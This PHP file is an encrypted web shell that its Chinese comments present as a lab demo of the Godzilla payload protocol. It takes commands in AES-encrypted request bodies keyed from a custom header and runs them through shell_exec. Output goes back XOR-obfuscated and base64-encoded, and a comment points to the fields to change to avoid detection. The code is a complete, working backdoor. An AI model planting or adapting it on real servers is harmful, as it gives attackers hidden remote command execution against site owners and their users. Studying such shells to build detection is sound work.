<?php
// 哥斯拉（Godzilla）PHP 型 payload 协议骨架 demo（本地实验环境）
// 原版协议：key=md5(password)[0:16]；请求 AES-128-ECB 解密执行；回传=base64 后逐字节
// XOR 流加密（前16字节=MD5(结果)[0:16] 作校验头）；会话通行证走 Cookie（pass 字段）
session_start();
$K = substr(md5($_SERVER['HTTP_X_G'] ?? ''), 0, 16);
if ($K === '') { http_response_code(404); exit; }
// 会话建立（首包）：返回 set-cookie 通行证——魔改面：通行证字段名/熵源自定义
if (!isset($_SESSION['p'])) { $_SESSION['p'] = bin2hex(random_bytes(8)); }
$in = openssl_decrypt(file_get_contents('php://input'), 'AES-128-ECB', $K, OPENSSL_RAW_DATA);
if ($in === false) { exit; }
$r = shell_exec(substr($in, 2));
// 回传流加密（哥斯拉式）：md5 头 + XOR
$h = substr(md5($r), 0, 16);
$o = '';
for ($i = 0; $i < strlen($r); $i++) { $o .= $r[$i] ^ $K[$i % 16]; }
echo base64_encode($h . $o);
